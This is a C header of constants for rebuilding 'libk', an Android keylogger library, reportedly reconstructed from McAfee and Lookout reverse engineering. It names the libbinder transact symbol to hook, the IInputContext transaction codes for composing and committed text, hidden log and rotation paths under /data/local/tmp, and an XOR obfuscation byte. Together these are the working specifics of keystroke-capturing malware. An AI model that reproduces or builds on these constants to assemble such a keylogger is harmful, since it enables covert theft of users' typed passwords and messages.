/* libk rebuild constants — from rodata.yaml + McAfee/Lookout RE */

#ifndef LIBK_STRINGS_H
#define LIBK_STRINGS_H

#define LIBK_HOOK_LIB           "/system/lib/libbinder.so"
#define LIBK_HOOK_SYMBOL \
    "_ZN7android14IPCThreadState8transactEijRKNS_6ParcelEPS1_j"

#define LIBK_INPUT_INTERFACE    "com.android.internal.view.IInputContext"

#define LIBK_KTMU_DIR           "/data/local/tmp/ktmu"
#define LIBK_ACTIVE_LOG         "/data/local/tmp/ktmu/ulmndd.tmp"
#define LIBK_ROTATED_FMT        "/data/local/tmp/ktmu/finidk.%ld"

#define LIBK_TX_SET_COMPOSING   6
#define LIBK_TX_COMMIT_TEXT     8

#define LIBK_XOR_BYTE           0xff
#define LIBK_LOG_TAG            "libk"

#endif
